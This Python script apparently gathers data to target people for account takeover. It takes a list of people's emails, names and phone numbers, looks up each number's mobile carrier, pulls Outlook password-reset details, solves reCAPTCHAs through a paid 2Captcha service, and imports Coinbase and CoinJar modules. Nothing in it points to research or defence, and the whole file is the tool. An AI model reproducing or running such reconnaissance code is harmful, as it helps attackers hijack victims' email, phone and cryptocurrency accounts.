import asyncio
import json
import carrier
import outlook
import coinbase
import coinjar
import twocaptcha


def parse_format(data):
    parsed = []
    for entry in data:
        entry = [*map(str.strip, entry.split("|"))]
        parsed.append({
            "email": entry[0],
            "name": entry[1],
            "phone_number": entry[-1].strip("+")
            })
        if entry[-1].startswith("0"):
            parsed[-1]['phone_number'] = "61" + parsed[-1]['phone_number'][1:]
        print(parsed[-1])
    return parsed


async def main():
    database = input("Load from: ")
    try:
        with open(database) as database:
            database = parse_format(database)
        print("Database entries:")
        for idx, entry in enumerate(database):
            try:
                print(f"\t{entry['name']}, {entry['email']} at "
                      f"{entry['phone_number']}")
            except KeyError as exc:
                raise KeyError(f"Entry #{idx}, {entry['name']}, is "
                                "misformatted")
    except IOError:
        raise IOError(f"{database!r} doesn't exist")
    output = input("Save to: ")

    with open("carrier_authentication.json") as carrier_auth:
        carrier_pool = carrier.CarrierPool(json.load(carrier_auth))

    with open("recaptcha_config.json") as recaptcha_config:
        recaptcha_config = json.load(recaptcha_config)

    solver = twocaptcha.TwoCaptcha(recaptcha_config['twocaptcha']['apikey'])
    solver.recaptcha_timeout = 60
    solver.polling_interval = 5

    results = []
    for idx, entry in enumerate(database):
        print(f"{entry['email']!r}: gathering carriers... ", end="",
                flush=True)
        carriers = await carrier_pool.get_carriers(entry['phone_number'])
        print(f"done\n{entry['email']!r}: gathering Outlook password reset "
               "info... ", end="", flush=True)
        password = await outlook.get_password_reset_info(entry['email'])
        print("done")
        results.append({
            "name": entry['name'],
            "email": entry['email'],
            "phone": entry['phone_number'],
            "carriers": carriers,
            "outlook_password_reset": password,
            })
    with open(output, "w") as foutput:
        json.dump(results, foutput)
    for result in results:
        is_carrier = ', '.join(
                f"{name}: {carrier}" \
                        for name, carrier in result['carriers'].items()
                )

        print(f"{result['email']}, {result['outlook_password_reset']}, "
              f"+{result['phone']}, {is_carrier}")
        print(f"completed, results in {output!r}")


if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())
